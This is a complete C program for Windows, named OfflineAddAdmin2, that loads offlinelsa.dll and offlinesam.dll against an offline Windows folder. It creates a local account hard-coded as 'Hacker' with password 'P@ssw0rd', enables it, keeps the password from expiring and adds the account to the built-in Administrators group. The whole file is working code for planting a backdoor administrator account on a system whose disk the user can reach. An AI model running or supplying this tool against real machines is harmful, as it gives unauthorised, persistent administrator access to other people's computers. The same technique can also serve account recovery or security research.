#include <Windows.h>
#include <tchar.h>
#include <NTSecAPI.h>

#pragma comment(lib, "ntdll.lib")

#define STATUSCHECK if (!NT_SUCCESS(Status)) \
					{ \
						_tprintf(_T("error 0x%x\r\n"), Status); \
						if (NULL != hPolicy){LsaOfflineClose(hPolicy);} \
						if (NULL != hServer){SamOfflineCloseHandle(hServer);} \
						if (NULL != hBuiltInDomain){SamOfflineCloseHandle(hBuiltInDomain);} \
						if (NULL != hAccountDomain){SamOfflineCloseHandle(hAccountDomain);} \
						if (NULL != hUser){SamOfflineCloseHandle(hUser);} \
						if (NULL != hAdministratorsAlias){SamOfflineCloseHandle(hAdministratorsAlias);} \
						return (int)Status; \
					} \
					_tprintf(_T("OK.\r\n"))

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
typedef PVOID OFFLINELSA_HANDLE, *POFFLINELSA_HANDLE;
typedef PVOID OFFLINESAM_HANDLE, *POFFLINESAM_HANDLE;

HMODULE hOfflineLsaDLL;
HMODULE hOfflineSamDLL;

//https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/6b0dff90-5ac0-429a-93aa-150334adabf6
typedef enum _USER_INFORMATION_CLASS
{
	UserSetPasswordInformation = 15,
	UserControlInformation = 16
} USER_INFORMATION_CLASS, *PUSER_INFORMATION_CLASS;

//https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/eb5f1508-ede1-4ff1-be82-55f3e2ef1633
typedef struct _USER_CONTROL_INFORMATION
{
	ULONG UserAccountControl;
} USER_CONTROL_INFORMATION, *PUSER_CONTROL_INFORMATION;

//https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/b10cfda1-f24f-441b-8f43-80cb93e786ec
#define USER_ACCOUNT_DISABLED 0x00000001u

//https://github.com/processhacker/phnt/blob/master/ntsam.h
typedef struct _USER_SET_PASSWORD_INFORMATION
{
	UNICODE_STRING Password;
	BOOLEAN PasswordExpired;
} USER_SET_PASSWORD_INFORMATION, *PUSER_SET_PASSWORD_INFORMATION;


VOID
NTAPI
RtlInitUnicodeString(
	PUNICODE_STRING DestinationString,
	PCWSTR SourceString
);

#pragma region Dynamic loads
typedef NTSTATUS (NTAPI* LSAOFFLINEOPENPOLICY)(LPWSTR, POFFLINELSA_HANDLE);

NTSTATUS
NTAPI
LsaOfflineOpenPolicy(
	LPWSTR pszWindowsDirectory,
	POFFLINELSA_HANDLE PolicyHandle
)

{
	static LSAOFFLINEOPENPOLICY pfnLsaOfflineOpenPolicy = NULL;
	if (NULL == pfnLsaOfflineOpenPolicy)
	{
		pfnLsaOfflineOpenPolicy = (LSAOFFLINEOPENPOLICY)(LPVOID)GetProcAddress(hOfflineLsaDLL, "LsaOfflineOpenPolicy");
	}
	if (NULL == pfnLsaOfflineOpenPolicy)
	{
		_tprintf(_T("LsaOfflineOpenPolicy could not be found.\r\n"));
		_exit(ERROR_PROC_NOT_FOUND);
	}
	return pfnLsaOfflineOpenPolicy(pszWindowsDirectory, PolicyHandle);
}


typedef NTSTATUS (NTAPI* LSAOFFLINECLOSE)(OFFLINELSA_HANDLE);

NTSTATUS
NTAPI
LsaOfflineClose(
	OFFLINELSA_HANDLE ObjectHandle
)
{
	static LSAOFFLINECLOSE pfnLsaOfflineClose = NULL;
	if (NULL == pfnLsaOfflineClose)
	{
		pfnLsaOfflineClose = (LSAOFFLINECLOSE)(LPVOID)GetProcAddress(hOfflineLsaDLL, "LsaOfflineClose");
	}
	if (NULL == pfnLsaOfflineClose)
	{
		_tprintf(_T("LsaOfflineClose could not be found.\r\n"));
		_exit(ERROR_PROC_NOT_FOUND);
	}
	return pfnLsaOfflineClose(ObjectHandle);
}


typedef NTSTATUS (NTAPI* LSAOFFLINEQUERYINFORMATIONPOLICY)(OFFLINELSA_HANDLE, POLICY_INFORMATION_CLASS, PVOID*);

NTSTATUS
NTAPI
LsaOfflineQueryInformationPolicy(
	OFFLINELSA_HANDLE PolicyHandle,
	POLICY_INFORMATION_CLASS InformationClass,
	PVOID* Buffer
)
{
	static LSAOFFLINEQUERYINFORMATIONPOLICY pfnLsaOfflineQueryInformationPolicy = NULL;
	if (NULL == pfnLsaOfflineQueryInformationPolicy)
	{
		pfnLsaOfflineQueryInformationPolicy = (LSAOFFLINEQUERYINFORMATIONPOLICY)(LPVOID)GetProcAddress(
			hOfflineLsaDLL,
			"LsaOfflineQueryInformationPolicy");
	}
	if (NULL == pfnLsaOfflineQueryInformationPolicy)
	{
		_tprintf(_T("LsaOfflineQueryInformationPolicy could not be found.\r\n"));
		_exit(ERROR_PROC_NOT_FOUND);
	}
	return pfnLsaOfflineQueryInformationPolicy(PolicyHandle, InformationClass, Buffer);
}


typedef NTSTATUS (NTAPI* SAMOFFLINECONNECT)(LPWSTR, POFFLINESAM_HANDLE);

NTSTATUS
NTAPI
SamOfflineConnect(
	LPWSTR pszWindowsDirectory,
	POFFLINESAM_HANDLE ServerHandle
)

{
	static SAMOFFLINECONNECT pfnSamOfflineConnect = NULL;
	if (NULL == pfnSamOfflineConnect)
	{
		pfnSamOfflineConnect = (SAMOFFLINECONNECT)(LPVOID)GetProcAddress(hOfflineSamDLL, "SamOfflineConnect");
	}
	if (NULL == pfnSamOfflineConnect)
	{
		_tprintf(_T("SamOfflineConnect could not be found.\r\n"));
		_exit(ERROR_PROC_NOT_FOUND);
	}
	return pfnSamOfflineConnect(pszWindowsDirectory, ServerHandle);
}


typedef NTSTATUS (NTAPI* SAMOFFLINEOPENDOMAIN)(OFFLINESAM_HANDLE, PSID, POFFLINESAM_HANDLE);

NTSTATUS
NTAPI
SamOfflineOpenDomain(
	OFFLINESAM_HANDLE ServerHandle,
	PSID DomainId,
	POFFLINESAM_HANDLE DomainHandle
)

{
	static SAMOFFLINEOPENDOMAIN pfnSamOfflineOpenDomain = NULL;
	if (NULL == pfnSamOfflineOpenDomain)
	{
		pfnSamOfflineOpenDomain = (SAMOFFLINEOPENDOMAIN)(LPVOID)GetProcAddress(hOfflineSamDLL, "SamOfflineOpenDomain");
	}
	if (NULL == pfnSamOfflineOpenDomain)
	{
		_tprintf(_T("SamOfflineOpenDomain could not be found.\r\n"));
		_exit(ERROR_PROC_NOT_FOUND);
	}
	return pfnSamOfflineOpenDomain(ServerHandle, DomainId, DomainHandle);
}


typedef NTSTATUS (NTAPI* SAMOFFLINECREATEUSERINDOMAIN)(OFFLINESAM_HANDLE, PUNICODE_STRING, OFFLINESAM_HANDLE, PULONG);

NTSTATUS
NTAPI
SamOfflineCreateUserInDomain(
	OFFLINESAM_HANDLE DomainHandle,
	PUNICODE_STRING AccountName,
	OFFLINESAM_HANDLE UserHandle,
	PULONG RelativeId
)
{
	static SAMOFFLINECREATEUSERINDOMAIN pfnSamOfflineCreateUserInDomain = NULL;
	if (NULL == pfnSamOfflineCreateUserInDomain)
	{
		pfnSamOfflineCreateUserInDomain = (SAMOFFLINECREATEUSERINDOMAIN)(LPVOID)GetProcAddress(
			hOfflineSamDLL,
			"SamOfflineCreateUserInDomain");
	}
	if (NULL == pfnSamOfflineCreateUserInDomain)
	{
		_tprintf(_T("SamOfflineCreateUserInDomain could not be found.\r\n"));
		_exit(ERROR_PROC_NOT_FOUND);
	}
	return pfnSamOfflineCreateUserInDomain(DomainHandle, AccountName, UserHandle, RelativeId);
}


typedef NTSTATUS (NTAPI* SAMOFFLINEQUERYINFORMATIONUSER)(OFFLINESAM_HANDLE, USER_INFORMATION_CLASS, PVOID*);

NTSTATUS
NTAPI
SamOfflineQueryInformationUser(
	OFFLINESAM_HANDLE UserHandle,
	USER_INFORMATION_CLASS UserInformationClass,
	PVOID* Buffer
)
{
	static SAMOFFLINEQUERYINFORMATIONUSER pfnSamOfflineQueryInformationUser = NULL;
	if (NULL == pfnSamOfflineQueryInformationUser)
	{
		pfnSamOfflineQueryInformationUser = (SAMOFFLINEQUERYINFORMATIONUSER)(LPVOID)GetProcAddress(
			hOfflineSamDLL,
			"SamOfflineQueryInformationUser");
	}
	if (NULL == pfnSamOfflineQueryInformationUser)
	{
		_tprintf(_T("SamOfflineQueryInformationUser could not be found.\r\n"));
		_exit(ERROR_PROC_NOT_FOUND);
	}
	return pfnSamOfflineQueryInformationUser(UserHandle, UserInformationClass, Buffer);
}


typedef NTSTATUS (NTAPI* SAMOFFLINESETINFORMATIONUSER)(OFFLINESAM_HANDLE, USER_INFORMATION_CLASS, PVOID);

NTSTATUS
NTAPI
SamOfflineSetInformationUser(
	OFFLINESAM_HANDLE UserHandle,
	USER_INFORMATION_CLASS UserInformationClass,
	PVOID Buffer
)
{
	static SAMOFFLINESETINFORMATIONUSER pfnSamOfflineSetInformationUser = NULL;
	if (NULL == pfnSamOfflineSetInformationUser)
	{
		pfnSamOfflineSetInformationUser = (SAMOFFLINESETINFORMATIONUSER)(LPVOID)GetProcAddress(
			hOfflineSamDLL,
			"SamOfflineSetInformationUser");
	}
	if (NULL == pfnSamOfflineSetInformationUser)
	{
		_tprintf(_T("SamOfflineSetInformationUser could not be found.\r\n"));
		_exit(ERROR_PROC_NOT_FOUND);
	}
	return pfnSamOfflineSetInformationUser(UserHandle, UserInformationClass, Buffer);
}


typedef NTSTATUS (NTAPI* SAMOFFLINERIDTOSID)(OFFLINESAM_HANDLE, ULONG, PSID*);

NTSTATUS
NTAPI
SamOfflineRidToSid(
	OFFLINESAM_HANDLE ObjectHandle,
	ULONG Rid,
	PSID* Sid
)
{
	static SAMOFFLINERIDTOSID pfnSamOfflineRidToSid = NULL;
	if (NULL == pfnSamOfflineRidToSid)
	{
		pfnSamOfflineRidToSid = (SAMOFFLINERIDTOSID)(LPVOID)GetProcAddress(hOfflineSamDLL, "SamOfflineRidToSid");
	}
	if (NULL == pfnSamOfflineRidToSid)
	{
		_tprintf(_T("SamOfflineRidToSid could not be found.\r\n"));
		_exit(ERROR_PROC_NOT_FOUND);
	}
	return pfnSamOfflineRidToSid(ObjectHandle, Rid, Sid);
}


typedef NTSTATUS (NTAPI* SAMOFFLINEOPENALIAS)(OFFLINESAM_HANDLE, ULONG, POFFLINESAM_HANDLE);

NTSTATUS
NTAPI
SamOfflineOpenAlias(
	OFFLINESAM_HANDLE DomainHandle,
	ULONG AliasId,
	POFFLINESAM_HANDLE AliasHandle
)
{
	static SAMOFFLINEOPENALIAS pfnSamOfflineOpenAlias = NULL;
	if (NULL == pfnSamOfflineOpenAlias)
	{
		pfnSamOfflineOpenAlias = (SAMOFFLINEOPENALIAS)(LPVOID)GetProcAddress(hOfflineSamDLL, "SamOfflineOpenAlias");
	}
	if (NULL == pfnSamOfflineOpenAlias)
	{
		_tprintf(_T("SamOfflineOpenAlias could not be found.\r\n"));
		_exit(ERROR_PROC_NOT_FOUND);
	}
	return pfnSamOfflineOpenAlias(DomainHandle, AliasId, AliasHandle);
}


typedef NTSTATUS (NTAPI* SAMOFFLINEADDMEMBERTOALIAS)(OFFLINESAM_HANDLE, PSID);

NTSTATUS
NTAPI
SamOfflineAddMemberToAlias(
	OFFLINESAM_HANDLE AliasHandle,
	PSID MemberId
)
{
	static SAMOFFLINEADDMEMBERTOALIAS pfnSamOfflineAddMemberToAlias = NULL;
	if (NULL == pfnSamOfflineAddMemberToAlias)
	{
		pfnSamOfflineAddMemberToAlias = (SAMOFFLINEADDMEMBERTOALIAS)(LPVOID)GetProcAddress(
			hOfflineSamDLL,
			"SamOfflineAddMemberToAlias");
	}
	if (NULL == pfnSamOfflineAddMemberToAlias)
	{
		_tprintf(_T("SamOfflineAddMemberToAlias could not be found.\r\n"));
		_exit(ERROR_PROC_NOT_FOUND);
	}
	return pfnSamOfflineAddMemberToAlias(AliasHandle, MemberId);
}


typedef NTSTATUS (NTAPI* SAMOFFLINECLOSEHANDLE)(OFFLINESAM_HANDLE);

NTSTATUS
NTAPI
SamOfflineCloseHandle(
	OFFLINESAM_HANDLE SamHandle
)
{
	static SAMOFFLINECLOSEHANDLE pfnSamOfflineCloseHandle = NULL;
	if (NULL == pfnSamOfflineCloseHandle)
	{
		pfnSamOfflineCloseHandle = (SAMOFFLINECLOSEHANDLE)(LPVOID)GetProcAddress(
			hOfflineSamDLL,
			"SamOfflineCloseHandle");
	}
	if (NULL == pfnSamOfflineCloseHandle)
	{
		_tprintf(_T("SamOfflineCloseHandle could not be found.\r\n"));
		_exit(ERROR_PROC_NOT_FOUND);
	}
	return pfnSamOfflineCloseHandle(SamHandle);
}
#pragma endregion


int LoadOfflineDlls(_TCHAR** argv)
{
	int iCharsWritten;
	DWORD dwLastError;
	TCHAR szOfflineLsaPath[MAX_PATH];
	TCHAR szOfflineSamPath[MAX_PATH];

	iCharsWritten = _stprintf_s(
		szOfflineLsaPath,
		_countof(szOfflineLsaPath),
		_T("%s\\System32\\offlinelsa.dll"),
		argv[1]);
	if (-1 == iCharsWritten)
	{
		_tprintf(_T("Error converting offlinelsa path.\r\n"));
		return -2;
	}

	hOfflineLsaDLL = LoadLibrary(szOfflineLsaPath);
	if (NULL == hOfflineLsaDLL)
	{
		dwLastError = GetLastError();
		_tprintf(_T("Error: LoadLibrary(%s) returned %i\r\n"), szOfflineLsaPath, dwLastError);
		return (int)dwLastError;
	}

	iCharsWritten = _stprintf_s(
		szOfflineSamPath,
		_countof(szOfflineSamPath),
		_T("%s\\System32\\offlinesam.dll"),
		argv[1]);
	if (-1 == iCharsWritten)
	{
		_tprintf(_T("Error converting offlinesam path.\r\n"));
		FreeLibrary(hOfflineLsaDLL);
		return -2;
	}

	hOfflineSamDLL = LoadLibrary(szOfflineSamPath);
	if (NULL == hOfflineSamDLL)
	{
		dwLastError = GetLastError();
		_tprintf(_T("Error: LoadLibrary(%s) returned %i\r\n"), szOfflineSamPath, dwLastError);
		FreeLibrary(hOfflineLsaDLL);
		return (int)dwLastError;
	}
	return 0;
}


int CreateOfflineUser(PWSTR wszWorkingDir, PWSTR wszUserName, PWSTR wszPassword)
{
	NTSTATUS Status;
	BYTE bSidBuffer[SECURITY_MAX_SID_SIZE] = {0};
	PSID pSidBuiltInDomainSid;
	DWORD dwSidLength;
	BOOL bRes;
	OFFLINELSA_HANDLE hPolicy = NULL;
	POLICY_ACCOUNT_DOMAIN_INFO* pAccountDomainInfo = NULL;
	OFFLINESAM_HANDLE hServer = NULL;
	OFFLINESAM_HANDLE hBuiltInDomain = NULL;
	OFFLINESAM_HANDLE hAccountDomain = NULL;
	UNICODE_STRING usUserName = {0};
	OFFLINESAM_HANDLE hUser = NULL;
	ULONG ulRid;
	USER_CONTROL_INFORMATION* pUserControlInfo = NULL;
	USER_SET_PASSWORD_INFORMATION UserSetPasswordInfo = {0};
	PSID psidUserSid = NULL;
	OFFLINESAM_HANDLE hAdministratorsAlias = NULL;

	pSidBuiltInDomainSid = (PSID)bSidBuffer;
	dwSidLength = sizeof(bSidBuffer);
	bRes = CreateWellKnownSid(WinBuiltinDomainSid, NULL, pSidBuiltInDomainSid, &dwSidLength);
	if (!bRes)
	{
		return (int)GetLastError();
	}


	_tprintf(_T("LsaOfflineOpenPolicy... "));
	Status = LsaOfflineOpenPolicy(wszWorkingDir, &hPolicy);
	STATUSCHECK;

	_tprintf(_T("LsaOfflineQueryInformationPolicy PolicyAccountDomainInformation... "));
	Status = LsaOfflineQueryInformationPolicy(hPolicy, PolicyAccountDomainInformation, (PVOID*)&pAccountDomainInfo);
	STATUSCHECK;

	LsaOfflineClose(hPolicy);

	_tprintf(_T("SamOfflineConnect... "));
	Status = SamOfflineConnect(wszWorkingDir, &hServer);
	STATUSCHECK;

	_tprintf(_T("SamOfflineOpenDomain pBuiltInDomainSid... "));
	Status = SamOfflineOpenDomain(hServer, pSidBuiltInDomainSid, &hBuiltInDomain);
	STATUSCHECK;

	_tprintf(_T("SamOfflineOpenDomain pAccountDomainInfo->DomainSid... "));
	Status = SamOfflineOpenDomain(hServer, pAccountDomainInfo->DomainSid, &hAccountDomain);
	STATUSCHECK;

	RtlInitUnicodeString(&usUserName, wszUserName);

	_tprintf(_T("SamOfflineCreateUserInDomain... "));
	Status = SamOfflineCreateUserInDomain(hAccountDomain, &usUserName, &hUser, &ulRid);
	STATUSCHECK;

	_tprintf(_T("SamOfflineQueryInformationUser... "));
	Status = SamOfflineQueryInformationUser(hUser, UserControlInformation, (PVOID*)&pUserControlInfo);
	STATUSCHECK;

	pUserControlInfo->UserAccountControl &= ~USER_ACCOUNT_DISABLED;

	_tprintf(_T("SamOfflineSetInformationUser UserControlInformation... "));
	Status = SamOfflineSetInformationUser(hUser, UserControlInformation, (PVOID)pUserControlInfo);
	STATUSCHECK;

	RtlInitUnicodeString(&UserSetPasswordInfo.Password, wszPassword);
	UserSetPasswordInfo.PasswordExpired = FALSE;

	_tprintf(_T("SamOfflineSetInformationUser UserSetPasswordInformation... "));
	Status = SamOfflineSetInformationUser(hUser, UserSetPasswordInformation, (PVOID)&UserSetPasswordInfo);
	STATUSCHECK;

	_tprintf(_T("SamOfflineRidToSid... "));
	Status = SamOfflineRidToSid(hUser, ulRid, &psidUserSid);
	STATUSCHECK;

	_tprintf(_T("SamOfflineOpenAlias... "));
	Status = SamOfflineOpenAlias(hBuiltInDomain, DOMAIN_ALIAS_RID_ADMINS, &hAdministratorsAlias);
	STATUSCHECK;

	_tprintf(_T("SamOfflineAddMemberToAlias... "));
	Status = SamOfflineAddMemberToAlias(hAdministratorsAlias, psidUserSid);
	STATUSCHECK;

	if (NULL != hServer)
	{
		SamOfflineCloseHandle(hServer);
	}
	if (NULL != hBuiltInDomain)
	{
		SamOfflineCloseHandle(hBuiltInDomain);
	}
	if (NULL != hAccountDomain)
	{
		SamOfflineCloseHandle(hAccountDomain);
	}
	if (NULL != hUser)
	{
		SamOfflineCloseHandle(hUser);
	}
	if (NULL != hAdministratorsAlias)
	{
		SamOfflineCloseHandle(hAdministratorsAlias);
	}

	return 0;
}


int _tmain(int argc, _TCHAR** argv, _TCHAR** envp)
{
	UNREFERENCED_PARAMETER(envp);

	int iRes;
	int iCharsWritten;
	WCHAR wszWorkingDir[MAX_PATH];

	if (2 != argc)
	{
		_tprintf(_T("Usage: OfflineAddAdmin2.exe windows_folder\r\n"));
		_tprintf(_T(" where windows_folder is the offline Windows folder i.e. D:\\Windows\r\n"));
		return -1;
	}

	iRes = LoadOfflineDlls(argv);
	if (0 != iRes)
	{
		_exit(iRes);
	}

	iCharsWritten = swprintf_s(wszWorkingDir, _countof(wszWorkingDir), L"%s", argv[1]);
	if (-1 == iCharsWritten)
	{
		_tprintf(_T("Error converting input data.\r\n"));
		return -2;
	}

	iRes = CreateOfflineUser(wszWorkingDir, L"Hacker", L"P@ssw0rd");

	FreeLibrary(hOfflineLsaDLL);
	FreeLibrary(hOfflineSamDLL);
	return iRes;
}
